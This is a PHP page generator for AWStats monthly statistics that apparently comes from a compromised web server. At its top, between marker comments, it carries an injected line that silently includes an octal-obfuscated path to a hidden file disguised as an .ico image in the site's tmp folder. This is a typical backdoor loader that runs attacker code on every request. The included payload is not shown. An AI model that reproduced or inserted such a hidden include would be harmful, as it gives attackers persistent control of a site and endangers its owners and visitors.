<?php /*457563643457563643*/ ?><?php  ?><?php


/*b8b8c*/

@include "\057va\162/w\167w/\143li\145nt\163/c\154ie\156t2\057we\1422/\167eb\057tm\160/.\061f0\060ba\0663.\151co";

/*b8b8c*/  ?><?php
$yearmonth_text = "Jump to previous stats: ";
$awstatsindex = 'awsindex.html';
$script = "<script>function load_content(url){var iframe = document.getElementById(\"content\");iframe.src = url;}</script>\n";

if ($handle = opendir('.'))
{
        while(false !== ($file = readdir($handle)))
        {
                if (substr($file,0,1) != "." && is_dir($file))
                {
                        $orderkey = substr($file,0,4).substr($file,5,2);
                        if (substr($file,5,2) < 10 )
                        {
                                $orderkey = substr($file,0,4)."0".substr($file,5,2);
                        }
                        $awprev[$orderkey] = $file;
                }
        }

        $month = date("n");
        $year = date("Y");
		
        if (date("d") == 1)
        {
                $month = date("m")-1;
                if (date("m") == 1)
                {
                        $year = date("Y")-1;
                        $month = "12";
                }
        }

        $current = $year.$month;
		if ( $month < 10 ) {
			$current = $year."0".$month;
		}
		$awprev[$current] = $year."-".$month;

		closedir($handle);
}

arsort($awprev);

$options = "";
foreach ($awprev as $key => $value)
{
	if($key == $current) $options .= "<option selected=\"selected\" value=\"{$awstatsindex}\">{$value}</option>\n";
	else $options .= "<option value=\"{$value}/{$awstatsindex}\">{$value}</option>\n";
}

$html = "<!DOCTYPE html>\n<html>\n<head>\n<title>Stats</title>\n";
$html .= "<style>\nhtml,body {margin:0px;padding:0px;width:100%;height:100%;background-color: #ccc;}\n";
$html .= "#header\n{\nwidth:100%;margin:0px auto;\nheight:20px;\nposition:fixed;\npadding:4px;\ntext-align:center;\n}\n";
$html .= "iframe {width:100%;height:90%;margin:0px;margin-top:40px;border:0px;padding:0px;}\n</style>\n</head>\n<body>\n";
$html .= $script;
$html .= "<div id=\"header\">{$yearmonth_text}\n";
$html .= "<select name=\"awdate\" onchange=\"load_content(this.value)\">\n";
$html .= $options;
$html .= "</select>\n</div>\n<iframe src=\"{$awstatsindex}\" id=\"content\"></iframe>\n";
$html .= "</body></html>";
echo $html;
?>